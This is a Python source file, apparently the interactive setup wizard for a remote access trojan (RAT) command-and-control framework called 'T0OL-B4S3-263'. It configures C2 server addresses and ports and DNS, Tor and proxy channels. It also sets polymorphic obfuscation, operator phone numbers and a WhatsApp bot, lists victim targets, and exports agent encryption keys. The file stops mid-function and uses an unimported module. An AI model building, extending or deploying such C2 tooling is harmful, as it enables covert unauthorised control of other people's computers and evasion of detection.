#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
    T0OL-B4S3-263 - MASTER UMBRELLA SETUP SYSTEM v2.0
    All-in-One Interactive Configuration & Management Platform
    
    Created by: Hxcker-263
    Owner Recognition: +263781564004
    
    Features:
    ✓ Multi-stage interactive setup wizard
    ✓ All RAT configurations in one place
    ✓ Target confirmation before commands
    ✓ Distributed key management
    ✓ Owner authorization system
    ✓ Hacker-themed UI with emojis
    ✓ No conflicting configurations
═══════════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import json
import socket
import subprocess
import time
import secrets
import base64
import yaml
import hashlib
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
from cryptography.fernet import Fernet

# ═══════════════════════════════════════════════════════════════════════════
# ANSI COLORS & HACKER THEME
# ═══════════════════════════════════════════════════════════════════════════

class HackerTheme:
    """Professional hacker-themed color scheme"""
    
    # Core Colors
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    
    # Standard Colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bright Colors
    BR_BLACK = '\033[90m'
    BR_RED = '\033[91m'
    BR_GREEN = '\033[92m'
    BR_YELLOW = '\033[93m'
    BR_BLUE = '\033[94m'
    BR_MAGENTA = '\033[95m'
    BR_CYAN = '\033[96m'
    BR_WHITE = '\033[97m'
    
    # Extended 256 Colors
    NEON_GREEN = '\033[38;5;46m'
    NEON_PINK = '\033[38;5;198m'
    NEON_BLUE = '\033[38;5;51m'
    NEON_PURPLE = '\033[38;5;141m'
    DARK_GRAY = '\033[38;5;240m'
    LIGHT_GRAY = '\033[38;5;248m'
    
    @staticmethod
    def apply(text: str, *colors) -> str:
        """Apply multiple colors to text"""
        color_str = ''.join(colors)
        return f"{color_str}{text}{HackerTheme.RESET}"

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION MANAGER
# ═══════════════════════════════════════════════════════════════════════════

class ConfigurationManager:
    """Centralized configuration management - NO CONFLICTS"""
    
    def __init__(self):
        self.config_file = "tool_base_263_master.json"
        self.HARDCODED_OWNERS = {"+263781564004": "PRIMARY_OWNER"}  # Immutable
        self.config = self._load_or_create_config()
    
    def _load_or_create_config(self) -> Dict:
        """Load existing or create new configuration"""
        default = {
            "version": "2.0",
            "creator": "Hxcker-263",
            "created_at": datetime.now().isoformat(),
            "last_modified": datetime.now().isoformat(),
            "configured": False,
            "targets_active": False,
            "targets_count": 0,
            
            # Server Configuration (SINGLE SOURCE OF TRUTH)
            "server": {
                "mode": "local",  # local | network | remote
                "primary_ip": "127.0.0.1",
                "backup_ip": None,
                "c2_port": 4444,
                "api_port": 5000,
                "webhook_port": 8888,
            },
            
            # Encryption (UNIFIED)
            "encryption": {
                "method": "fernet",
                "key": None,  # Generated once, used everywhere
                "iv": None,
                "key_rotation_days": 30,
                "last_rotated": None,
            },
            
            # Authorization (OWNER RECOGNITION)
            "authorization": {
                "hardcoded_owner": "+263781564004",
                "authorized_owners": ["+263781564004"],  # Always includes hardcoded
                "require_confirmation": True,
                "confirmation_keyword": "CONFIRM_TARGETS_263",
            },
            
            # C2 Channels (NO CONFLICTS - ONE PER TYPE)
            "c2_channels": {
                "https": {"enabled": False, "certificate": None},
                "dns": {"enabled": False, "domain": None},
                "proxy": {"enabled": False, "proxy_url": None},
                "tor": {"enabled": False, "control_port": 9051},
                "websocket": {"enabled": False, "endpoint": None},
            },
            
            # Obfuscation (UNIFIED SETTINGS)
            "obfuscation": {
                "enabled": True,
                "level": 4,  # 1-4: basic to maximum
                "techniques": {
                    "string_encoding": True,
                    "control_flow": True,
                    "junk_code": True,
                    "polymorphic": True,
                },
                "entropy_size_kb": 2,
            },
            
            # WhatsApp Integration
            "whatsapp": {
                "enabled": False,
                "owners": ["+263781564004"],
                "command_prefix": "/",
                "auto_respond": True,
            },
            
            # Deployment Targets
            "targets": {
                "managed_list": [],  # List of active targets
                "require_manual_confirmation": True,
            },
            
            # Logging & Monitoring
            "logging": {
                "enabled": True,
                "log_file": "tool_base_263.log",
                "log_level": "INFO",
                "compress_logs": True,
            },
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                # Merge with defaults to ensure all keys exist
                default.update(loaded)
                return default
            except Exception as e:
                print(f"Error loading config: {e}. Using defaults.")
                return default
        
        return default
    
    def save(self):
        """Save configuration to file"""
        self.config["last_modified"] = datetime.now().isoformat()
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Error saving config: {e}")
            return False
    
    def get(self, path: str, default=None):
        """Get config value by path (dot notation)"""
        keys = path.split('.')
        value = self.config
        for key in keys:
            if isinstance(value, dict):
                value = value.get(key)
            else:
                return default
        return value if value is not None else default
    
    def set(self, path: str, value):
        """Set config value by path (dot notation)"""
        keys = path.split('.')
        config = self.config
        for key in keys[:-1]:
            if key not in config:
                config[key] = {}
            config = config[key]
        config[keys[-1]] = value
        self.save()

# ═══════════════════════════════════════════════════════════════════════════
# YAML CONFIGURATION LOADER (Unified Config Support)
# ═══════════════════════════════════════════════════════════════════════════

class ConfigLoader:
    """
    YAML-based configuration loader for umbrella_config.yaml
    Unified configuration management for all framework components (Agent, Server, Bot)
    Supports dot-notation access, environment variable overrides, and change detection
    """
    
    def __init__(self, config_path: str = "umbrella_config.yaml"):
        """Initialize config loader with path to master config file"""
        self.config_path = Path(config_path)
        self.config = {}
        self.config_hash = None
        self.last_loaded = None
        self.logger = self._setup_logger()
        self.reload()
    
    def _setup_logger(self) -> logging.Logger:
        """Setup logging for config operations"""
        logger = logging.getLogger("ConfigLoader")
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger
    
    def reload(self) -> bool:
        """Reload configuration from YAML file. Returns True if config changed."""
        try:
            if not self.config_path.exists():
                self.logger.warning(f"Config file not found: {self.config_path}")
                return False
            
            with open(self.config_path, 'r', encoding='utf-8') as f:
                new_config = yaml.safe_load(f)
            
            if not new_config:
                self.logger.error("Config file is empty or invalid YAML")
                return False
            
            new_hash = self._calculate_hash(new_config)
            config_changed = (new_hash != self.config_hash)
            
            self.config = new_config
            self.config_hash = new_hash
            self.last_loaded = datetime.now()
            
            self._apply_env_overrides()
            self._validate_config()
            
            if config_changed:
                self.logger.info("Configuration reloaded successfully")
            return True
        
        except yaml.YAMLError as e:
            self.logger.error(f"YAML parsing error: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Failed to load config: {e}")
            return False
    
    def _calculate_hash(self, config: Dict) -> str:
        """Calculate hash of configuration for change detection"""
        config_str = json.dumps(config, sort_keys=True)
        return hashlib.sha256(config_str.encode()).hexdigest()
    
    def _apply_env_overrides(self):
        """Apply environment variable overrides to config"""
        if os.getenv('RAT_SERVER_IP') and 'server' in self.config:
            self.config['server']['primary_ip'] = os.getenv('RAT_SERVER_IP')
        if os.getenv('RAT_SERVER_PORT') and 'server' in self.config:
            self.config['server']['listen_port'] = int(os.getenv('RAT_SERVER_PORT'))
        if os.getenv('RAT_API_PORT') and 'server' in self.config:
            self.config['server']['api_port'] = int(os.getenv('RAT_API_PORT'))
        
        if os.getenv('RAT_CALLBACK_IP') and 'agent' in self.config:
            self.config['agent']['callback_ip'] = os.getenv('RAT_CALLBACK_IP')
        if os.getenv('RAT_CALLBACK_PORT') and 'agent' in self.config:
            self.config['agent']['callback_port'] = int(os.getenv('RAT_CALLBACK_PORT'))
        
        if os.getenv('RAT_BOT_PREFIX') and 'bot' in self.config:
            self.config['bot']['whatsapp']['bot_prefix'] = os.getenv('RAT_BOT_PREFIX')
    
    def _validate_config(self):
        """Validate critical configuration values"""
        try:
            required_sections = ['server', 'agent', 'bot', 'security']
            for section in required_sections:
                if section not in self.config:
                    self.logger.warning(f"Missing section: {section}")
            
            if 'server' in self.config:
                port = self.config['server'].get('listen_port', 4444)
                if not (1 <= port <= 65535):
                    self.logger.warning(f"Invalid server listen_port: {port}")
            
            self.logger.debug("Configuration validated")
        except Exception as e:
            self.logger.error(f"Validation error: {e}")
    
    def get(self, key_path: str, default: Any = None) -> Any:
        """Get configuration value by dot-notation path (e.g., 'server.listen_port')"""
        keys = key_path.split('.')
        value = self.config
        try:
            for key in keys:
                if isinstance(value, dict):
                    value = value[key]
                else:
                    return default
            return value
        except (KeyError, TypeError):
            return default
    
    def get_server_config(self) -> Dict:
        """Get complete server configuration"""
        return self.config.get('server', {})
    
    def get_agent_config(self) -> Dict:
        """Get complete agent configuration"""
        return self.config.get('agent', {})
    
    def get_bot_config(self) -> Dict:
        """Get complete bot configuration"""
        return self.config.get('bot', {})
    
    def update(self, key_path: str, value: Any) -> bool:
        """Update a configuration value and persist to disk"""
        try:
            keys = key_path.split('.')
            config = self.config
            
            for key in keys[:-1]:
                if key not in config:
                    config[key] = {}
                config = config[key]
            
            config[keys[-1]] = value
            self._save_config()
            self.logger.info(f"Updated {key_path}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to update: {e}")
            return False
    
    def _save_config(self) -> bool:
        """Save current configuration to disk"""
        try:
            with open(self.config_path, 'w', encoding='utf-8') as f:
                yaml.dump(self.config, f, default_flow_style=False, sort_keys=False)
            self.config_hash = self._calculate_hash(self.config)
            return True
        except Exception as e:
            self.logger.error(f"Failed to save: {e}")
            return False
    
    def get_status(self) -> Dict:
        """Get configuration status information"""
        return {
            'config_path': str(self.config_path),
            'exists': self.config_path.exists(),
            'last_loaded': str(self.last_loaded) if self.last_loaded else None,
            'config_hash': self.config_hash,
            'server_ip': self.get('server.primary_ip'),
            'server_port': self.get('server.listen_port'),
        }
    
    def export_all(self) -> str:
        """Export entire configuration as JSON"""
        return json.dumps(self.config, indent=2)

# ═══════════════════════════════════════════════════════════════════════════
# CONFIG WATCHER - File Monitoring & Auto-Reload
# ═══════════════════════════════════════════════════════════════════════════

class ConfigWatcher:
    """Monitor config file changes and notify subscribers"""
    
    def __init__(self, config_loader: ConfigLoader, check_interval: int = 5):
        """Initialize config watcher"""
        self.config_loader = config_loader
        self.check_interval = check_interval
        self.watchers = []  # List of callback functions
        self.last_hash = None
        self.watching = False
        self.watch_thread = None
    
    def subscribe(self, callback):
        """Subscribe to config changes"""
        self.watchers.append(callback)
    
    def unsubscribe(self, callback):
        """Unsubscribe from config changes"""
        if callback in self.watchers:
            self.watchers.remove(callback)
    
    def start_watching(self):
        """Start watching config file for changes"""
        if self.watching:
            return
        
        self.watching = True
        self.watch_thread = threading.Thread(target=self._watch_loop, daemon=True)
        self.watch_thread.start()
        HackerTheme.apply('Config watcher started', HackerTheme.BR_GREEN)
    
    def stop_watching(self):
        """Stop watching config file"""
        self.watching = False
        if self.watch_thread:
            self.watch_thread.join(timeout=2)
    
    def _watch_loop(self):
        """Watch loop that checks for config changes"""
        while self.watching:
            try:
                # Reload and check for changes
                if self.config_loader.reload():
                    # Config changed
                    for callback in self.watchers:
                        try:
                            callback(self.config_loader.config)
                        except Exception as e:
                            self.config_loader.logger.error(f"Watcher callback error: {e}")
                
                time.sleep(self.check_interval)
            
            except Exception as e:
                self.config_loader.logger.error(f"Watch error: {e}")
                time.sleep(self.check_interval)

# ═══════════════════════════════════════════════════════════════════════════
# CONFIG BUILDER - Intelligent Config Generation
# ═══════════════════════════════════════════════════════════════════════════

class ConfigBuilder:
    """Build optimal configurations based on deployment profile"""
    
    @staticmethod
    def detect_environment() -> Dict[str, Any]:
        """Detect local environment and deployment type"""
        import socket
        
        detection = {
            "local_ip": None,
            "is_vm": False,
            "platform": sys.platform,
            "has_docker": os.path.exists("/.dockerenv"),
        }
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            detection["local_ip"] = s.getsockname()[0]
            s.close()
        except:
            detection["local_ip"] = "127.0.0.1"
        
        return detection
    
    @staticmethod
    def recommend_config(profile: str) -> Dict[str, Any]:
        """Recommend configuration based on profile"""
        env = ConfigBuilder.detect_environment()
        
        recommendations = {
            "LocalTest": {
                "server": {
                    "listen_ip": "0.0.0.0",
                    "listen_port": 4444,
                    "api_port": 5000,
                    "primary_ip": env["local_ip"],
                    "max_concurrent_agents": 100,
                },
                "security": {
                    "require_auth": True,
                    "enable_encryption": True,
                },
            },
            "RemoteServer": {
                "server": {
                    "listen_ip": "0.0.0.0",
                    "listen_port": 443,
                    "api_port": 8443,
                    "primary_ip": env["local_ip"],
                    "max_concurrent_agents": 1000,
                },
                "security": {
                    "require_auth": True,
                    "enable_encryption": True,
                    "enable_ssl": True,
                },
            },
            "HybridMode": {
                "server": {
                    "listen_ip": "0.0.0.0",
                    "listen_port": 4444,
                    "api_port": 5000,
                    "primary_ip": env["local_ip"],
                    "max_concurrent_agents": 500,
                    "nat_traversal": {
                        "enabled": True,
                        "stun_server": "stun.l.google.com",
                    },
                },
                "security": {
                    "require_auth": True,
                    "enable_encryption": True,
                },
            },
        }
        
        return recommendations.get(profile, recommendations["LocalTest"])

# ═══════════════════════════════════════════════════════════════════════════
# DISPLAY UTILITIES
# ═══════════════════════════════════════════════════════════════════════════

class Display:
    """All display/UI utilities"""
    
    @staticmethod
    def clear():
        """Clear screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def banner():
        """Main banner with hacker theme"""
        banner_text = f"""
{HackerTheme.apply('', HackerTheme.NEON_GREEN, HackerTheme.BOLD)}
    ███████╗███████╗ ██████╗ ████████╗███╗   ███╗███████╗███████╗██╗  ██╗
    ╚═══╝  ║╚═══╝  ║╚════██╗╚══██╔══╝████╗ ████║╚════╝ ╚════╝  ║  ║  ║
        ███║    ███║ █████╔╝   ██║   ██╔████╔██║  ███║    ███║    ╚██╗██╔╝
       ██╔╝    ██╔╝  ██╔═██╗   ██║   ██║╚██╔╝██║ ██╔╝    ██╔╝     ╚███╔╝ 
      ███████╗███████╗██║  ██╗  ██║   ██║ ╚═╝ ██║███████╗███████╗  ╚██╔╝  
      ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═╝   ╚═╝     ╚═╝╚══════╝╚══════╝   ╚═╝   
{HackerTheme.RESET}
{HackerTheme.apply('═' * 80, HackerTheme.NEON_PINK)}
{HackerTheme.apply('T0OL-B4S3-263 v2.0 | Master Umbrella Setup System', HackerTheme.BR_CYAN, HackerTheme.BOLD)}
{HackerTheme.apply('Created by: Hxcker-263 | Owner: +263781564004', HackerTheme.BR_YELLOW)}
{HackerTheme.apply('═' * 80, HackerTheme.NEON_PINK)}
        """
        print(banner_text)
    
    @staticmethod
    def header(title: str, emoji: str = "🔥"):
        """Section header"""
        line = HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)
        title_text = HackerTheme.apply(f"{emoji} {title} {emoji}", HackerTheme.BOLD, HackerTheme.BR_CYAN)
        print(f"\n{line}")
        print(f"║ {title_text.center(74)} ║")
        print(f"{line}\n")
    
    @staticmethod
    def status(message: str, status_type: str = "info"):
        """Status message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        icons = {
            "success": "✓",
            "error": "✗",
            "warning": "⚠",
            "info": "●",
            "config": "⚙",
            "target": "🎯",
            "key": "🔑",
        }
        
        colors = {
            "success": (HackerTheme.BR_GREEN, ""),
            "error": (HackerTheme.BR_RED, ""),
            "warning": (HackerTheme.BR_YELLOW, ""),
            "info": (HackerTheme.NEON_BLUE, ""),
            "config": (HackerTheme.BR_MAGENTA, ""),
            "target": (HackerTheme.BR_CYAN, ""),
            "key": (HackerTheme.NEON_PINK, ""),
        }
        
        icon = icons.get(status_type, "●")
        color, _ = colors.get(status_type, (HackerTheme.CYAN, ""))
        
        print(f"{color}[{timestamp}] {icon} {message}{HackerTheme.RESET}")
    
    @staticmethod
    def menu_item(number: int, title: str, description: str = "", emoji: str = ""):
        """Pretty menu item"""
        if description:
            print(f"  {HackerTheme.apply(str(number), HackerTheme.BR_GREEN)}. {emoji} {HackerTheme.apply(title, HackerTheme.BOLD)} - {description}")
        else:
            print(f"  {HackerTheme.apply(str(number), HackerTheme.BR_GREEN)}. {emoji} {HackerTheme.apply(title, HackerTheme.BOLD)}")
    
    @staticmethod
    def section(title: str):
        """Info section"""
        print(f"\n{HackerTheme.apply(title, HackerTheme.BR_MAGENTA, HackerTheme.BOLD)}")
        print(HackerTheme.apply('─' * len(title), HackerTheme.DARK_GRAY))
    
    @staticmethod
    def prompt(message: str, default: str = "", show_prompt: bool = True) -> str:
        """Interactive prompt"""
        prompt_char = HackerTheme.apply("[Hxcker-263]> ", HackerTheme.NEON_GREEN, HackerTheme.BOLD)
        if default:
            message = f"{message} {HackerTheme.apply(f'[{default}]', HackerTheme.DARK_GRAY)}"
        
        if show_prompt:
            response = input(f"\n{HackerTheme.apply(message, HackerTheme.BR_CYAN)}\n{prompt_char}").strip()
        else:
            response = input(f"{HackerTheme.apply(message, HackerTheme.BR_CYAN)}\n{prompt_char}").strip()
        
        return response if response else default
    
    @staticmethod
    def confirm(message: str) -> bool:
        """Confirmation prompt"""
        response = Display.prompt(f"{message} (y/n)", "y").lower()
        return response in ['y', 'yes']
    
    @staticmethod
    def table(headers: List[str], rows: List[List[str]]):
        """Display formatted table"""
        # Calculate column widths
        widths = [len(h) for h in headers]
        for row in rows:
            for i, cell in enumerate(row):
                widths[i] = max(widths[i], len(str(cell)))
        
        # Header
        header_line = " | ".join(HackerTheme.apply(h.ljust(w), HackerTheme.BR_CYAN, HackerTheme.BOLD) for h, w in zip(headers, widths))
        print(f"\n{header_line}")
        print(HackerTheme.apply("─" * (sum(widths) + len(headers) * 3 - 1), HackerTheme.DARK_GRAY))
        
        # Rows
        for row in rows:
            row_line = " | ".join(
                HackerTheme.apply(str(cell).ljust(w), HackerTheme.WHITE) 
                for cell, w in zip(row, widths)
            )
            print(row_line)

# ═══════════════════════════════════════════════════════════════════════════
# AUTHORIZATION SYSTEM
# ═══════════════════════════════════════════════════════════════════════════

class AuthorizationManager:
    """Handle owner recognition and authorization"""
    
    HARDCODED_OWNERS = {"+263781564004": "PRIMARY_OWNER"}
    
    def __init__(self, config: ConfigurationManager):
        self.config = config
    
    def verify_owner(self, phone: str) -> bool:
        """Verify if phone is authorized owner"""
        authorized = self.config.get("authorization.authorized_owners", [])
        return phone in authorized or phone in self.HARDCODED_OWNERS
    
    def add_owner(self, phone: str) -> bool:
        """Add new authorized owner"""
        if not phone.startswith("+"):
            phone = "+" + phone
        
        owners = self.config.get("authorization.authorized_owners", [])
        if phone not in owners:
            owners.append(phone)
            self.config.set("authorization.authorized_owners", owners)
            return True
        return False
    
    def remove_owner(self, phone: str) -> bool:
        """Remove authorized owner"""
        # Cannot remove hardcoded owner
        if phone in self.HARDCODED_OWNERS:
            return False
        
        owners = self.config.get("authorization.authorized_owners", [])
        if phone in owners:
            owners.remove(phone)
            self.config.set("authorization.authorized_owners", owners)
            return True
        return False
    
    def get_all_owners(self) -> Dict[str, str]:
        """Get all authorized owners"""
        owners = {}
        
        # Add hardcoded
        owners.update(self.HARDCODED_OWNERS)
        
        # Add others
        for owner in self.config.get("authorization.authorized_owners", []):
            if owner not in owners:
                owners[owner] = "SECONDARY_OWNER"
        
        return owners

# ═══════════════════════════════════════════════════════════════════════════
# TARGET MANAGEMENT WITH CONFIRMATION
# ═══════════════════════════════════════════════════════════════════════════

class TargetManager:
    """Manage active targets with confirmation requirements"""
    
    def __init__(self, config: ConfigurationManager):
        self.config = config
        self.targets = config.get("targets.managed_list", [])
    
    def add_target(self, hostname: str, ip: str, os: str) -> bool:
        """Add new target to managed list"""
        target = {
            "id": len(self.targets) + 1,
            "hostname": hostname,
            "ip": ip,
            "os": os,
            "added_at": datetime.now().isoformat(),
            "status": "active",
            "command_count": 0,
        }
        self.targets.append(target)
        self.config.set("targets.managed_list", self.targets)
        self.config.set("targets_active", True)
        self.config.set("targets_count", len(self.targets))
        return True
    
    def list_targets(self) -> List[Dict]:
        """List all active targets"""
        return self.targets
    
    def confirm_targets(self, keyword: str) -> bool:
        """Confirm targets before accepting commands"""
        if not self.targets:
            Display.status("❌ No targets currently active!", "error")
            return False
        
        required_keyword = self.config.get("authorization.confirmation_keyword")
        if keyword != required_keyword:
            Display.status(f"❌ Invalid confirmation keyword!", "error")
            return False
        
        Display.status(f"✓ {len(self.targets)} targets confirmed and ready for commands", "success")
        return True
    
    def execute_command(self, command: str) -> Dict:
        """Execute command on targets (requires prior confirmation)"""
        if not self.targets:
            return {"status": "error", "message": "No targets active"}
        
        return {
            "status": "executing",
            "command": command,
            "targets": len(self.targets),
            "timestamp": datetime.now().isoformat(),
        }

# ═══════════════════════════════════════════════════════════════════════════
# KEY DISTRIBUTION SYSTEM
# ═══════════════════════════════════════════════════════════════════════════

class KeyDistribution:
    """Manage encryption keys for distribution"""
    
    def __init__(self, config: ConfigurationManager):
        self.config = config
    
    def generate_master_key(self) -> str:
        """Generate master encryption key"""
        key = Fernet.generate_key().decode()
        self.config.set("encryption.key", key)
        self.config.set("encryption.last_rotated", datetime.now().isoformat())
        return key
    
    def get_distribution_package(self) -> Dict:
        """Get all keys for distribution"""
        return {
            "version": self.config.get("version"),
            "creator": self.config.get("creator"),
            "c2_server": {
                "ip": self.config.get("server.primary_ip"),
                "c2_port": self.config.get("server.c2_port"),
                "api_port": self.config.get("server.api_port"),
            },
            "encryption": {
                "method": self.config.get("encryption.method"),
                "key": self.config.get("encryption.key"),
            },
            "authorization": {
                "owners": list(AuthorizationManager(self.config).get_all_owners().keys()),
            },
            "timestamp": datetime.now().isoformat(),
        }
    
    def export_keys(self, filename: str = "distribution_keys.json"):
        """Export keys to file"""
        package = self.get_distribution_package()
        try:
            with open(filename, 'w') as f:
                json.dump(package, f, indent=2)
            Display.status(f"Keys exported to {filename}", "success")
            return True
        except Exception as e:
            Display.status(f"Export failed: {e}", "error")
            return False
    
    def display_keys_for_sharing(self):
        """Display all keys in readable format for sharing"""
        Display.header("DISTRIBUTION KEYS", "🔑")
        
        package = self.get_distribution_package()
        
        print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}")
        print(f"{HackerTheme.apply('C2 SERVER INFORMATION', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")
        
        print(f"  {HackerTheme.apply('IP Address:', HackerTheme.BR_CYAN, HackerTheme.BOLD)} {HackerTheme.apply(package['c2_server']['ip'], HackerTheme.NEON_GREEN)}")
        print(f"  {HackerTheme.apply('C2 Port:', HackerTheme.BR_CYAN, HackerTheme.BOLD)} {HackerTheme.apply(str(package['c2_server']['c2_port']), HackerTheme.NEON_GREEN)}")
        print(f"  {HackerTheme.apply('API Port:', HackerTheme.BR_CYAN, HackerTheme.BOLD)} {HackerTheme.apply(str(package['c2_server']['api_port']), HackerTheme.NEON_GREEN)}\n")
        
        print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}")
        print(f"{HackerTheme.apply('ENCRYPTION KEY', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")
        
        key = package['encryption']['key']
        # Display with line breaks every 40 chars
        for i in range(0, len(key), 40):
            print(f"  {HackerTheme.apply(key[i:i+40], HackerTheme.NEON_GREEN)}")
        
        print(f"\n{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}")
        print(f"{HackerTheme.apply('AUTHORIZED OWNERS', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")
        
        for i, owner in enumerate(package['authorization']['owners'], 1):
            owner_type = "[PRIMARY]" if owner in AuthorizationManager(self.config).HARDCODED_OWNERS else "[SECONDARY]"
            print(f"  {i}. {HackerTheme.apply(owner, HackerTheme.NEON_GREEN)} {HackerTheme.apply(owner_type, HackerTheme.BR_YELLOW)}")
        
        print(f"\n{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")

# ═══════════════════════════════════════════════════════════════════════════
# INTERACTIVE SETUP WIZARD
# ═══════════════════════════════════════════════════════════════════════════

class MasterSetupWizard:
    """Complete interactive setup wizard"""
    
    def __init__(self):
        self.config = ConfigurationManager()
        self.auth = AuthorizationManager(self.config)
        self.targets = TargetManager(self.config)
        self.keys = KeyDistribution(self.config)
    
    def step_server_configuration(self):
        """Step 1: Server Configuration"""
        Display.clear()
        Display.banner()
        Display.header("STEP 1: SERVER CONFIGURATION", "🖥️")
        
        print("Choose C2 server deployment mode:\n")
        Display.menu_item(1, "Local", "127.0.0.1 (this machine only)", "💻")
        Display.menu_item(2, "Network", "Accessible on local network", "🌐")
        Display.menu_item(3, "Remote", "Custom IP for remote deployment", "🚀")
        
        choice = Display.prompt("Select mode")
        
        if choice == '1':
            self.config.set("server.mode", "local")
            self.config.set("server.primary_ip", "127.0.0.1")
            Display.status("Mode: LOCAL (127.0.0.1)", "config")
        
        elif choice == '2':
            self.config.set("server.mode", "network")
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                detected_ip = s.getsockname()[0]
                s.close()
            except:
                detected_ip = "192.168.1.100"
            
            print(f"\n{HackerTheme.apply('Detected network IP:', HackerTheme.BR_YELLOW)} {detected_ip}")
            use_detected = Display.confirm("Use this IP?")
            
            if use_detected:
                self.config.set("server.primary_ip", detected_ip)
            else:
                custom_ip = Display.prompt("Enter your network IP")
                self.config.set("server.primary_ip", custom_ip)
            
            Display.status(f"Mode: NETWORK ({self.config.get('server.primary_ip')})", "config")
        
        elif choice == '3':
            self.config.set("server.mode", "remote")
            remote_ip = Display.prompt("Enter remote C2 server IP")
            self.config.set("server.primary_ip", remote_ip)
            self.config.set("server.backup_ip", Display.prompt("Enter backup IP (optional)", ""))
            Display.status(f"Mode: REMOTE ({remote_ip})", "config")
        
        input("\nPress ENTER to continue...")
    
    def step_port_configuration(self):
        """Step 2: Port Configuration"""
        Display.clear()
        Display.banner()
        Display.header("STEP 2: PORT CONFIGURATION", "🔌")
        
        c2_port = Display.prompt("C2 Server Port", "4444")
        api_port = Display.prompt("API Bridge Port", "5000")
        webhook_port = Display.prompt("Webhook Port", "8888")
        
        self.config.set("server.c2_port", int(c2_port))
        self.config.set("server.api_port", int(api_port))
        self.config.set("server.webhook_port", int(webhook_port))
        
        Display.status(f"C2 Port: {c2_port}", "config")
        Display.status(f"API Port: {api_port}", "config")
        Display.status(f"Webhook Port: {webhook_port}", "config")
        
        input("\nPress ENTER to continue...")
    
    def step_encryption_setup(self):
        """Step 3: Encryption Setup"""
        Display.clear()
        Display.banner()
        Display.header("STEP 3: ENCRYPTION KEY SETUP", "🔐")
        
        if self.config.get("encryption.key"):
            Display.status("Existing encryption key found", "info")
            regenerate = Display.confirm("Generate new key?")
            if not regenerate:
                Display.status("Using existing key", "info")
                input("\nPress ENTER to continue...")
                return
        
        Display.status("Generating master encryption key...", "info")
        key = self.keys.generate_master_key()
        
        Display.status("Master key generated successfully!", "success")
        print(f"\n{HackerTheme.apply('Key (first 50 chars):', HackerTheme.BR_YELLOW)} {key[:50]}...")
        
        input("\nPress ENTER to continue...")
    
    def step_owner_management(self):
        """Step 4: Owner Management"""
        Display.clear()
        Display.banner()
        Display.header("STEP 4: OWNER AUTHORIZATION", "👑")
        
        print(f"\n{HackerTheme.apply('Hardcoded Primary Owner:', HackerTheme.BR_MAGENTA, HackerTheme.BOLD)}")
        print(f"  {HackerTheme.apply('+263781564004', HackerTheme.NEON_GREEN)} {HackerTheme.apply('[IMMUTABLE]', HackerTheme.BR_RED)}")
        
        print(f"\n{HackerTheme.apply('Authorized Owners:', HackerTheme.BR_MAGENTA, HackerTheme.BOLD)}")
        for i, owner in enumerate(self.auth.get_all_owners().items(), 1):
            print(f"  {i}. {HackerTheme.apply(owner[0], HackerTheme.NEON_GREEN)} ({owner[1]})")
        
        print()
        Display.menu_item(1, "Add new owner", "", "➕")
        Display.menu_item(2, "Remove owner", "", "➖")
        Display.menu_item(3, "Continue to next step", "", "✓")
        
        while True:
            choice = Display.prompt("Select option")
            
            if choice == '1':
                phone = Display.prompt("Enter phone number (with + and country code)")
                if self.auth.add_owner(phone):
                    Display.status(f"Added owner: {phone}", "success")
                else:
                    Display.status("Owner already exists or invalid", "warning")
            
            elif choice == '2':
                phone = Display.prompt("Enter phone to remove")
                if self.auth.remove_owner(phone):
                    Display.status(f"Removed: {phone}", "success")
                elif phone in self.auth.HARDCODED_OWNERS:
                    Display.status("Cannot remove hardcoded owner!", "error")
                else:
                    Display.status("Owner not found", "warning")
            
            elif choice == '3':
                break
        
        input("\nPress ENTER to continue...")
    
    def step_target_setup(self):
        """Step 5: Target Setup"""
        Display.clear()
        Display.banner()
        Display.header("STEP 5: TARGET CONFIGURATION", "🎯")
        
        print(f"{HackerTheme.apply('Add targets that will be managed by this C2', HackerTheme.BR_YELLOW)}\n")
        
        while True:
            Display.menu_item(1, "Add new target", "", "➕")
            Display.menu_item(2, "View targets", "", "📋")
            Display.menu_item(3, "Continue to next step", "", "✓")
            
            choice = Display.prompt("Select option")
            
            if choice == '1':
                hostname = Display.prompt("Target hostname")
                ip = Display.prompt("Target IP address")
                os = Display.prompt("Target OS (Windows/Linux/macOS)")
                
                if self.targets.add_target(hostname, ip, os):
